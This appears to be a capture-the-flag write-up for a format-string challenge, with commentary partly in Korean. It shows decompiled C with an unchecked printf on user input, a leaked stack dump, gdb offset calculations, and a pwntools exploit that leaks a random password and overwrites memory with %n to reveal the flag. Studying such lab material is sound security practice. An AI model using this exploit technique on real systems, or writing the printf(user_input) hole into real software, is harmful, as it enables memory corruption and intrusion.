

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char *v3; // rsi
  char *v4; // rdi
  __int64 v5; // rdx
  __int64 v6; // rcx
  __int64 v7; // r8
  __int64 v8; // r9
  const char *v9; // rsi
  __int64 v10; // rdx
  __int64 v11; // rcx
  __int64 v12; // r8
  __int64 v13; // r9
  char s2[8]; // [rsp+0h] [rbp-E0h] BYREF
  __int64 v15; // [rsp+8h] [rbp-D8h]
  char v16[8]; // [rsp+10h] [rbp-D0h] BYREF
  __int64 v17; // [rsp+18h] [rbp-C8h]
  char dest[8]; // [rsp+20h] [rbp-C0h] BYREF
  __int64 v19; // [rsp+28h] [rbp-B8h]
  char v20[132]; // [rsp+30h] [rbp-B0h] BYREF
  char src[8]; // [rsp+B4h] [rbp-2Ch] BYREF
  int v22; // [rsp+BCh] [rbp-24h] BYREF
  FILE *stream; // [rsp+C0h] [rbp-20h]
  void *ptr; // [rsp+C8h] [rbp-18h]
  int v25; // [rsp+D4h] [rbp-Ch]
  int v26; // [rsp+D8h] [rbp-8h]
  int i; // [rsp+DCh] [rbp-4h]

  init();
  intro();
  i = 0;
  v25 = 0;
  v22 = 0;
  v26 = 0;
  *(_QWORD *)src = 'nr3vyw';
  memset(v20, 0, 0x80uLL);
  *(_QWORD *)dest = 0LL;
  v19 = 0LL;
  *(_QWORD *)v16 = 0LL;
  v17 = 0LL;
  *(_QWORD *)s2 = 0LL;
  v15 = 0LL;
  ptr = malloc(8uLL);
  stream = fopen("/dev/urandom", "r");
  fread(ptr, 7uLL, 1uLL, stream);
  v3 = src;
  v4 = dest;
  strcpy(dest, src);
  while ( 1 )
  {
    menu(v4, v3, v5, v6, v7, v8);
    fflush(stdout);
    v3 = (char *)&v22;
    v4 = "%d";
    __isoc99_scanf("%d", &v22);
    if ( v22 == 3 )
      break;
    if ( v22 <= 3 )
    {
      if ( v22 == 1 )
      {
        puts("\n-Kind kid list-");
        for ( i = 0; i <= 5; ++i )
          puts(&v20[16 * i]);
        puts("\n-Naughty kid list-");
        for ( i = 0; i <= 7; ++i )
          putchar(dest[i]);
        v4 = (char *)&byte_2072;
        puts(&byte_2072);
      }
      else if ( v22 == 2 )
      {
        printf("\nPassword : ");
        fflush(stdout);
        __isoc99_scanf("%8s", s2);
        v3 = s2;
        if ( !strncmp((const char *)ptr, s2, 7uLL) )
        {
          printf("Name : ");
          fflush(stdout);
          v3 = v16;
          __isoc99_scanf("%8s", v16);
          if ( v26 > 7 )
          {
            v4 = "Kind list full";
            puts("Kind list full");
          }
          else
          {
            v3 = v16;
            v4 = &v20[16 * v26];
            strcpy(v4, v16);
            ++v26;
          }
        }
        else
        {
          printf(s2);
          v4 = " is Wrong password!";
          puts(" is Wrong password!");
        }
      }
    }
  }
  v25 = 0;
  v9 = "wyv3rn";
  if ( !strcmp(v20, "wyv3rn") )
  {
    for ( i = 0; i <= 5; ++i )
    {
      v9 = &src[i];
      if ( !strcmp(&dest[i], v9) )
      {
        puts("Wyv3rn : My name is still remain on the naughty kid list!");
        exit(0);
      }
    }
    puts("\nWyv3rn : You did it!");
    puts("Wyv3rn : Here is flag!");
    flag("Wyv3rn : Here is flag!", v9, v10, v11, v12, v13);
    exit(0);
  }
  puts("Wyv3rn : My name is not on the kind kid list!");
  exit(0);
}
```

---
```c
0x7fffefa701f0.0x25.0xffffffff.(nil).(nil).0x70243625.(nil).(nil).(nil).0x6e7233767977.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x3376797700000002.0x200006e72.0x55fd684712c0.0x55fd684712a0.0x1000.(nil).0x1.0x7fb1704f2d90.(nil).0x55fd36a4b3ce.
```
---
offset  = 6
0x70243625 / 6번째부터 rsp 삽입

---
```c
  0x00005578a0ccf475 <+167>:	call   0x5578a0ccf0d0 <malloc@plt>
   0x00005578a0ccf47a <+172>:	mov    %rax,-0x18(%rbp)
   0x00005578a0ccf47e <+176>:	lea    0xd16(%rip),%rax        # 0x5578a0cd019b
   0x00005578a0ccf485 <+183>:	mov    %rax,%rsi
   0x00005578a0ccf488 <+186>:	lea    0xd15(%rip),%rax        # 0x5578a0cd01a4
   0x00005578a0ccf48f <+193>:	mov    %rax,%rdi

```

---
malloc 반환값을 rbp - 0x18에 저장해둔다

---

```c
rbp - 0xe0 =>s2  // password input
rbp - 0xd0 =>v16 // name input

```
input 위치

---
rbp - 0xe0 / rbp - 0x18 

---
```c
(gdb) p/x 0xe0 - 0x18
$2 = 0xc8
(gdb) p/d 0xc8
$3 = 200
(gdb) p/d 200/8
$4 = 25
(gdb) 

```
---
우리가 입력한 값으로 부터 25번째 까지 떨어져있음
기존 offset이였던 6을 더해주면 31번째 인자에 password가 있다

---

둘째 우리가 입력한 password input과 name input은 맞닿아있다 password_input는 rsp / rsp + 8 위치가 name 이다 여기서 name은 badnamelist를 말하는것이며 우리가 6번째 인자값부터 시작하므로 8번째 인자를 덮어주면 bad name이 덮힌다

---
<span style="color: #00FF00; font-weight: bold;">Payload</span>

---
```c
from pwn import *

#p = remote("127.0.0.1",7182)
p = remote("host8.dreamhack.games",21197)

p.sendlineafter(b">> ",b"2")
p.sendlineafter(b"Password : ",b"%31$s")
leak_output = p.recvuntil(b' is Wrong password!')
raw_password = leak_output.replace(b' is Wrong password!', b'')
password = raw_password[:7]

p.sendlineafter(b">> ",b"2")

p.sendlineafter(b"Password : ",b"%p")
stack_in = p.recvuntil(b" is Wrong password!")
stack = int(stack_in[:14],16)
print(hex(stack))

wyv_addr = stack + 0x20

p.sendlineafter(b">> ",b"2")
p.sendlineafter(b"Password : ",password)
p.sendlineafter(b"Name : ",b"wyv3rn")

print(1)

p.sendlineafter(b">> ",b"2")
p.sendlineafter(b"Password : ",password)
p.sendlineafter(b"Name : ",p64(wyv_addr))

p.sendlineafter(b">> ",b"2")
p.sendlineafter(b"Password : ",b"a%8$ln")



p.sendlineafter(b">> ",b"1")

p.interactive()
```
---
